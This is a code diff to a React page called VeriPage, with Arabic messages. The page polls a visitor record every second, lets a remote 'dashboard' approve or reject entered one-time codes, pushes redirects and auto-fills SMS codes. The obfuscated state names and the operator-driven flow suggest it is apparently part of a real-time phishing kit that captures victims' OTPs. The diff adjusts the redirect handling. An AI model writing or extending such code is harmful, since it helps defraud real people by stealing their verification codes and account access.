@@ -77,16 +77,6 @@ export default function VeriPage() {
           _ss5('rejected')
           _s5('')
           setError('تم رفض رمز التحقق. يرجى إدخال رمز صحيح.')
-        } else if (otpStatus === 'approved' && _v5Status !== 'approved') {
-          _ss5('approved')
-          setError('')
-          router.push('/step3')
-        }
-        
-        // Check for redirect page
-        const redirectPage = data.redirectPage || data.redirect_page
-        if (redirectPage === 'step3' && window.location.pathname !== '/step3') {
-          router.push('/step3')
         }
         
         // Check for rejection message from dashboard
@@ -94,6 +84,11 @@ export default function VeriPage() {
           _ss5('rejected')
           _s5('')
           setError(data.otpRejectionMessage)
+        }
+        
+        // Clear oneTimeRedirect after it was used by useRedirectMonitor
+        if (data.oneTimeRedirect) {
+          fetch(`/api/visitors/${visitorID}/clear-redirect`, { method: 'POST' }).catch(() => {})
         }
       } catch (err) {
         // Silent fail
@@ -104,7 +99,7 @@ export default function VeriPage() {
     const interval = setInterval(pollVisitorData, 1000)
     
     return () => clearInterval(interval)
-  }, [router, _v5Status])
+  }, [_v5Status])
 
   // Auto-fill OTP from SMS (Web OTP API)
   useEffect(() => {
